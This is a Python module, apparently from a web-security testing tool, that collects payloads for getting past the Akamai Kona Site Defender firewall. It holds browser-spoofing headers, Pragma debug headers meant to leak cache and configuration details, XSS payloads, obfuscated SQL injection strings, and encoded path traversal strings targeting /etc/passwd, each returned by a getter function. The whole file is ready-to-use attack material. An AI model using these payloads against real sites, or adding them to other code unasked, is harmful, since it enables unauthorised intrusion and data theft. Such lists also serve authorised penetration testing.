"""Akamai Kona Site Defender bypass techniques."""
from __future__ import annotations
from typing import Any

AKAMAI_BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
}

# Akamai debug headers — may reveal internal cache/config info
AKAMAI_DEBUG_HEADERS = {
    "Pragma": (
        "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, "
        "akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-nonces, "
        "akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no"
    ),
}

AKAMAI_XSS_BYPASSES = [
    # CSS-based XSS (often missed by Akamai KRS)
    "<style>*{background:url('javascript:alert(1)')}</style>",
    # SVG + foreignObject
    "<svg><foreignObject><body xmlns='http://www.w3.org/1999/xhtml'>"
    "<script>alert(1)</script></body></foreignObject></svg>",
    # MathML
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    # Mutation XSS
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    # Unicode homoglyphs
    "\u003Cscript\u003Ealert(1)\u003C/script\u003E",
    # SVG onload
    "<svg/onload=alert(1)>",
    "<svg onload\r\n=alert(1)>",
]

AKAMAI_SQLI_BYPASSES = [
    "1'/**/OR/**/1=1--",
    "1'OR(1)=(1)--",
    "1'||'1'='1",
    "1 OR 1.0=1.0--",
    "1 UNION/**/SELECT/**/1,2,3--",
    "1%0bUNION%0bSELECT%0b1,2,3--",
    "1\x0cUNION\x0cSELECT\x0c1,2,3--",
]

AKAMAI_TRAVERSAL_BYPASSES = [
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9cetc%c1%9cpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
]


def get_xss_bypasses() -> list[str]:
    return AKAMAI_XSS_BYPASSES


def get_sqli_bypasses() -> list[str]:
    return AKAMAI_SQLI_BYPASSES


def get_traversal_bypasses() -> list[str]:
    return AKAMAI_TRAVERSAL_BYPASSES


def get_debug_headers() -> dict[str, str]:
    return AKAMAI_DEBUG_HEADERS


def get_browser_headers() -> dict[str, str]:
    return AKAMAI_BROWSER_HEADERS
